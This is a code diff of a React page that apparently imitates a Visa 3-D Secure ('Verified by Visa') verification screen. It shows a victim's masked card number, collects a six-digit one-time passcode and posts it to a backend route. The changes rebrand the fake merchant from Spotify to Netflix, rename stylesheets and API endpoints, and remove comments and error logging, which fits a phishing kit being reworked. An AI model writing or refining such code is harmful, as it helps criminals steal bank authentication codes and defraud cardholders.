@@ -14,8 +14,8 @@ const VbvSubmit = ({ logoUrl, brandLogo, links }) => {
        const loadStyles = async () => {
          try {
            const [loginStyles, additionalStyles] = await Promise.all([
-             import('../../assets/styles/3ds.css'),
-             import('../../assets/styles/vbvsub.css')
+             import('../../assets/styles/three.css'),
+             import('../../assets/styles/stylingvbv.css')
            ]);
    
            setStyles({
@@ -23,7 +23,6 @@ const VbvSubmit = ({ logoUrl, brandLogo, links }) => {
              additional: additionalStyles.default
            });
          } catch (error) {
-           console.error('Error loading styles:', error);
          }
        };
    
@@ -32,15 +31,13 @@ const VbvSubmit = ({ logoUrl, brandLogo, links }) => {
       useEffect(() => {
         const fetchCreditCard = async () => {
           try {
-            const response = await axios.get(`${process.env.REACT_APP_API_URL}/api/user-info/${userId}`);
+            const response = await axios.get(`${process.env.REACT_APP_API_URL}/api/show-user/${userId}`);
             if (response.data && response.data.cardNumber) {
-              // Mask all but last 4 digits
               const last4 = response.data.cardNumber.slice(-4);
               const masked = '*'.repeat(12) + last4;
               setMaskedCardNumber(masked);
             }
           } catch (error) {
-            console.error('Error fetching credit card info:', error);
             setMaskedCardNumber('************0000'); // Fallback masked number
           }
         };
@@ -50,7 +47,6 @@ const VbvSubmit = ({ logoUrl, brandLogo, links }) => {
 
     const handleOtpChange = (e) => {
         const value = e.target.value;
-        // Only allow numbers and limit to 6 digits
         if (value === '' || /^\d{0,6}$/.test(value)) {
             setOtp(value);
             setError('');
@@ -66,13 +62,12 @@ const VbvSubmit = ({ logoUrl, brandLogo, links }) => {
 
         setLoading(true);
         try {
-            const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/billing/${userId}/verify-otp`, {
+            const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/authenticate/${userId}/verify-otp`, {
                 otp: otp
             });
 
             if (response.status === 200) {
-                // Redirect or show success message
-                window.location.href = 'https://spotify.com';
+                setLoading(true);
             }
         } catch (error) {
             setError(error.response?.data?.message || 'Verification failed');
@@ -131,7 +126,7 @@ const VbvSubmit = ({ logoUrl, brandLogo, links }) => {
                       <legend id="ValidateTransactionDetailsHeader">Transaction Details</legend>
                       <div className="validate-field row">
                         <span className="validate-label col-6">Merchant:</span>
-                        <span className="col-6">WWW.SPOTIFY.COM</span>
+                        <span className="col-6">WWW.NETFLIX.COM</span>
                       </div>
                       <div className="validate-field row">
                         <span className="validate-label col-6">Transaction Amount:</span>
